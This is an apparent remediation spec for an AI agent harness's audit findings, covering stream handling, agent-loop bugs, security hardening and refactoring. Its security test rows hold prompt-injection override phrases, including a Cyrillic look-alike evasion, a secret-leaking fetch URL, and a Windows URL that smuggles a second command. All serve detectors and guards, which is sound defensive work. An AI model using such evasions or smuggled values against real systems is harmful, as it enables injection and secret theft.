# Specification: Keryx Audit Remediation — 2026-09-27

Version: 0.1.1

## 0. Status

Specification written; nothing implemented. Line references are as of the
audit commits (see [findings.md](findings.md)); the named function is the
anchor.

## 1. Module identity

No new module. Changes land in existing modules: `harness/provider`,
`harness` (agent loop, child), `commands/shell`, `security`, `harness/web`,
`mcp-servers`, `lib/oauth`, `cli`, `wiki`, `health`, `security/path-scan`.

## 2. Storage structure

No new storage. Two existing artifacts change shape:

- `.metaproject/data/security/` scan reports: the effective limits already
  live at `scope.limits.{maxFiles,maxBytes,…}` (`src/security/types.ts`);
  new is a `coverage.skipped` list of paths excluded by ignore rules (R5.1).
- `.metaproject/data/health/artifacts/latest.json` optional-source entries gain
  a `note` string when status is `missing` (R5.2).

## 3. Manifest / config shape

- `keryx security scan` already accepts `--max-files`/`--max-bytes`
  (`src/commands/security.ts`, usage string); defaults unchanged (1 000,
  8 MiB). New: `security/policy.json` may set `scan.limits.maxBytes` and
  `scan.respectIgnoreRules` (default true).
- No other config changes.

## 4. Required behaviour, per finding

Each row: current behaviour → required behaviour → test. Tests fail without
the fix.

### 4.1 Provider adapters (R1)

| Id | Current | Required | Test |
|---|---|---|---|
| L-1 | Compat adapter: EOF during tool-call accumulation → `flushPendingToolEnds` emits `tool_call_end` with partial JSON; `model_end` gated on `sawFinish`; generator ends silently. | EOF with a pending tool call → `provider_error {kind:"malformed", retryable:true-or-false per policy}` naming the call id; no `tool_call_end` for the partial call. Same event shape the native adapter emits. | `openai-compat-provider.test.ts`: two `tool_calls` delta chunks then socket close → one `provider_error`, zero `tool_call_end`. |
| L-2 | Gemini streaming loop ignores an `{"error":{…}}` chunk; stream then ends without `finishReason` → `malformed, retryable:false`. | A chunk whose top-level object is an `error` envelope is passed to `classifyGeminiError`; the resulting `provider_error` carries its `kind`/`retryable`; the stream ends there. | `gemini-provider.test.ts`: text chunk, then `{"error":{"code":503,"status":"UNAVAILABLE"}}`, close → `provider_error.retryable === true`, `kind` = the pre-2xx classification of 503. |
| L-3 | `callId = functionCall.id ?? callName`. | `callId = functionCall.id ?? `${callName}#${index}`` where `index` counts function-call parts in the response; ids unique within a response. | Two `functionCall` parts named `read_file`, no ids → two distinct `toolCallId`s; `linkToolCalls` pairs each result to its own call. |
| L-9 | Each text-target replay item overwrites `parts[textPartIndex].thoughtSignature`. | Either (a) one text part per signature, or (b) a documented decision that Gemini accepts one signature per text part, with the dropped signatures logged at debug level. Decision recorded in the adapter's header comment after an endpoint probe. | For (a): two replay items → two text parts with two signatures on the wire. For (b): a test asserting the debug log names the dropped signature. |
| L-10 | Codex branch spreads a fixed object without `max_output_tokens`; the comment above says the field is always sent. | Probe the Codex Responses endpoint with `max_output_tokens`. Accepted → send it on both branches. Rejected → keep the omission and rewrite the comment to say the subscription endpoint rejects it. | Test pins whichever branch the probe decides; the comment and the test agree. |
| L-11 | `usage.input_tokens_details.cached_tokens` never read. | Map it to `usage.cacheReadTokens` (the field the Anthropic adapter fills); cost accounting applies the cached rate. | Usage event with `cached_tokens: 1200` → `cacheReadTokens === 1200` and the metrics cost line uses it. |

Shared behaviour table (new file `src/harness/provider/stream-contract.test.ts`):
for each adapter × {EOF mid tool-call, in-stream error, missing call id} one
row, one assertion. This is the test that keeps the four adapters agreeing.

### 4.2 Harness and shell (R2)

| Id | Current | Required | Test |
|---|---|---|---|
| L-12 | Sequential loop calls `executeCall` bare. | Wrap as the concurrent path does: a thrown tool or approval callback becomes `{isError:true, output:<message>}`; the turn continues; `Stop` hook fires at the end. | `agent.test.ts`: tool `invoke` throws → turn ends with a tool result marked error and the `Stop` hook recorded. |
| L-13 | `provisionWorktrees` leaves earlier worktrees when a later `create()` throws. | On throw, remove the worktrees it created in this call, then rethrow. Or delete the helper (no callers). | Second `create` throws → first worktree removed. |
| L-14 | `/new`, `/clear` keep `lastToolOutput`/`lastToolName`. | Both reset on `/new` and `/clear`. | `/new` then `/expand` → "nothing to expand". |
| L-15 | `completionWaiters` grows per operator line. | Waiters keyed by turn; resolved, superseded or older-than-N entries dropped; size bounded by the number of live background jobs + 1. | 100 operator lines with no completions → waiter count ≤ 2. |
| R-M3 | Test header claims AC1 coverage. | Header states the guarded functions have no production caller and the test pins the contract for a future caller; or the caller lands. | Header text and a `keryx ctx rg` for callers agree (a test that greps is acceptable here: the claim is about callers). |
| R-I3 | Duplicate source-text audit. | Delete it; the runtime test in `shell-agent-repl.test.ts` and `shell-bus.test.ts` (flow 352 review r1) covers it. Update the source-text-audit manifest. | `shell-source-audits.test.ts` passes with the row removed. |

### 4.3 Security depth (R3)

| Id | Current | Required | Test |
|---|---|---|---|
| S-6 | Pattern-only redaction. | After the pattern pass, run `detect/entropy.ts` on tokens ≥ 20 chars with the scan's thresholds; allow-shapes for 40-hex git SHAs, UUIDs, and known id prefixes; redact as `[REDACTED:entropy]`. Measured on `keryx security eval --corpus redaction` before merge; regression budget: precision not below the current corpus value. | Bearer `<random base64, 43 chars>` in tool output → redacted; a 40-hex commit SHA → untouched. |
| S-7 | `[^.\n]{0,N}` gaps; ASCII only. | Fold Unicode confusables (NFKC + a confusables map for Cyrillic/Greek look-alikes) before matching; gaps allow `\s` including newline. Corpus gains the two evasions. | "Ignore all previous\ninstructions" and "Ignіre all previous instructions" (Cyrillic і) → both detected. |
| S-8 | Public-host check only. | Before connecting, run the secret detectors (patterns + entropy) over the URL and query; a hit refuses the call with `reason: "outbound secret-shaped content"` and records a security finding. | `web_fetch({url:"https://x.example/c?k=sk-…"})` → refused, no `fetch` call, finding recorded. |
| S-9 | Path printed verbatim. | `displayUrl` masks any path segment ≥ 16 chars that matches the token shapes or the entropy detector as `…`. | `https://host/v1/<32-hex>/mcp` → `https://host/v1/…/mcp` in `mcp list`, `mcp doctor --json`, trust prompt. |
| S-10 | win32 plan `cmd /c start "" <url>`. | Use `rundll32 url.dll,FileProtocolHandler <url>` or `powershell -NoProfile Start-Process <url>` with the URL as one argv entry; reject a URL whose scheme is not `https` or that contains characters outside RFC 3986. | win32 plan for `https://a/?x=1&calc.exe&` → refused before spawn; a clean URL → argv contains it unchanged. |
| R-MIN1 | Classifier in `mcp-servers/spawn-env.ts`. | Move `isDeniedForMcpChild` and its regexes to `src/security/credential-shape.ts`; both callers import it. | Import-policy test passes; behaviour tests unchanged. |
| R-I1 | Case-sensitive first pass. | Compare upper-cased names. | `anthropic_api_key` stripped. |
| R-I2 | Unanchored glued regex. | Anchor to `(^|_)…($|_)` or whole-name match. | Existing boundary rows stay allowed; glued rows stay denied. |

### 4.4 Architecture debt (R4)

| Id | Required move | Guard |
|---|---|---|
| A-1 | Delete the `impact-evidence` re-exports from `security/service.ts`; `commands/security-impact-evidence.ts` imports from `../security/impact-evidence`; add an `impact-evidence` zone to `src/lib/import-zones.ts`. | `keryx gdgraph query cycles` no longer lists the three security↔testing cycles; `import-policy.live.test.ts` passes. |
| A-2 | New `src/cli-registry.ts` holding `CLI_ROUTES` and `printCommandHelp`; `cli.ts` and `commands/help.ts` import it. | Cycle gone; the help fixture tests (`flow 303 AC5`) unchanged. |
| A-3 | New `src/wiki/key-files.ts` with `keyFilesForPage` and its index type. | Cycle gone. |
| A-5 | New `src/mcp-servers/json-utils.ts` with `parseJsonTolerant`. | Cycle gone. |
| A-6 | `retryableFor` exported from `provider-port.ts`; four copies deleted. `buildExactUsage(input, output, total)` in `provider-port.ts`. | Each adapter's retry tests pass unchanged. |
| A-4 | Recorded as accepted in the ledger with the hoisting argument. | — |
| A-8 | `gdgraph` orphan query reads `bunfig.toml` `preload` entries as roots. | `lib/test-preload.ts` absent from `gdgraph query orphans`. |
| A-7 | Seams recorded: `tui/approval.ts`, `tui/pickers.ts`, `tui/panels.ts`, `tui/format-utils.ts`. Split not in this package. | — |

### 4.5 Tooling and dogfood (R5)

| Id | Required | Test |
|---|---|---|
| G-2 | The existing `--max-bytes`/`--max-files` flags stay; new: the traversal skips paths the repository's ignore rules exclude, lists them under `coverage.skipped`, and on the keryx tree `coverage.status === "complete"` at the default limits. | `path-scan.test.ts`: a tree with an ignored 10 MiB file scans complete and lists the skip. A CI job runs `keryx security scan . --json` on the repository and asserts `complete`. |
| G-3 | `resolveBin` already falls back to `Bun.which` (`src/health/sources/helpers.ts`), so binary resolution is not the gap; establish whether `compatibleReportForHealth` or `hasTestFiles` (which scans `ctx.sourceFiles`) excludes keryx's own tree, fix that, and make the optional-source line say which check failed. Same for `coverage`. | On the keryx tree `keryx health run` → `tests: available`; on a tree without test files → `skipped` with the reason printed. |
| G-4 | `tasks` and `mcp` module manifests declare only directories `keryx init`/`update` create, or `update` creates them. | `keryx standard validate` on a fresh `init` tree: zero warnings. |
| G-5 | `keryx update` lists agent worktrees older than 7 days with no branch ahead of `main` and offers to prune (confirmation; `--yes` in CI). | Fixture with two stale and one live worktree → two listed, pruned only on yes. |

## 5. CLI / skill surface

- `keryx security scan` — no new flags (`--max-bytes`/`--max-files` exist);
  new `--no-ignore` to disable the ignore-rule skipping (G-2).
- `keryx update` — new "stale worktrees" prompt (G-5).
- No new skills. The `review-security-code` skill's checklist gains the three
  new evasion cases (S-7, S-8) as prompts.

## 6. Data contracts

No `schemas/*.json` in this package by decision: every contract below is a
field added to an existing event or report whose shape is owned by code
(`src/harness/provider/types.ts`, `src/security/types.ts`). The implementing
flow updates those types and their existing tests; a schema file here would
be a second copy to keep in step.

- `provider_error` event: unchanged shape; new `detail.pendingToolCallId` when
  the cause is EOF mid tool-call (L-1).
- Usage event: `cacheReadTokens` populated by the OpenAI adapter (L-11).
- Security finding: new `policyId` values `egress.outbound-secret` (S-8) and
  `secrets.entropy` (S-6, redaction).

## 7. Integration points

- `keryx security eval` corpus: new cases under `redaction/` and `injection/`.
- Import policy zones (`src/lib/import-zones.ts`): `impact-evidence`,
  `cli-registry`, `security/credential-shape`.
- `shell-source-audits.test.ts` manifest: one row removed (R-I3); A-2 must
  not add one.
- CI: a "security scan completes on this tree" job (G-2).

## 8. Acceptance criteria

- AC1: For each of the four adapters, the stream-contract table test passes for
  EOF mid tool-call, in-stream error and missing call id (L-1, L-2, L-3).
- AC2: L-9 and L-10 each have a recorded endpoint probe result and a test that
  pins the chosen behaviour.
- AC3: An OpenAI usage event with `cached_tokens` sets `cacheReadTokens` (L-11).
- AC4: A throwing tool in the sequential loop ends the turn with an error tool
  result and a fired `Stop` hook (L-12).
- AC5: `/new` then `/expand` shows nothing from the previous session; 100
  operator lines leave ≤ 2 completion waiters (L-14, L-15).
- AC6: Redaction removes a 43-char base64 bearer token and keeps a 40-hex SHA;
  the redaction corpus precision does not drop (S-6).
- AC7: Both injection evasions are detected (S-7); a secret-shaped `web_fetch`
  URL is refused before connecting (S-8).
- AC8: `mcp list` masks a token-shaped path segment (S-9); the win32 open plan
  refuses a URL with shell metacharacters (S-10).
- AC9: `keryx gdgraph query cycles` on the result lists at most the two A-4
  facade loops; `retryableFor` exists once (A-1, A-2, A-3, A-5, A-6).
- AC10: `keryx security scan . --json` on the keryx repository reports coverage
  `complete`; `keryx health run` reports no unexplained `missing` source;
  `keryx standard validate` on a fresh tree has zero warnings (G-2, G-3, G-4).
- AC11: Every ledger row in [findings.md](findings.md) carries `fixed` (PR,
  test) or `accepted` (reason).
